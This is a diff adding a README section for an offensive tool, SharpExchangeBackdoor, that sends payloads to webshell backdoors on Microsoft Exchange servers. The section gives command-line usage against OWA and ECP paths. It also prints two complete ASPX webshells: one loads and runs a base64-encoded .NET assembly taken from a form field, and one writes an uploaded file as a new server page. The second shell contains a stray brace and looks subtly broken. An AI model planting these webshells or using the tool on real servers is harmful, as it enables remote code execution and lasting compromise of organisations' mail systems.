@@ -504,3 +504,44 @@ Eg:
 
 ---
 
+### SharpExchangeBackdoor.cs
+
+Python Version: [SharpExchangeBackdoor.py](https://github.com/3gstudent/Homework-of-Python/blob/master/SharpExchangeBackdoor.py)
+
+Use to send payload to the Exchange webshell backdoor.
+
+Support:
+
+- assemblyLoad
+- webshellWrite
+
+Usage:
+
+```
+    <url> <user> <password> <mode> <path>
+mode:
+    assemblyLoad
+    webshellWrite
+```
+
+eg.
+
+```
+    SharpExchangeBackdoor.exe https://192.168.1.1/owa/auth/errorFE.aspx no auth assemblyLoad payload.dll
+    SharpExchangeBackdoor.exe https://192.168.1.1/ecp/About.aspx user1 123456 webshellWrite payload.aspx
+```
+
+assemblyLoad.aspx:
+
+```
+<%@ Page Language="C#" %><%System.Reflection.Assembly.Load(Convert.FromBase64String(Request.Form["demodata"])).CreateInstance("Payload").Equals("");%>
+```
+
+webshellWrite.aspx:
+
+```
+<%@ Page Language="C#" %><%if (Request.Files.Count!=0)Request.Files[0].SaveAs(Server.MapPath("./uploadDemo.aspx"));}%>
+```
+
+---
+
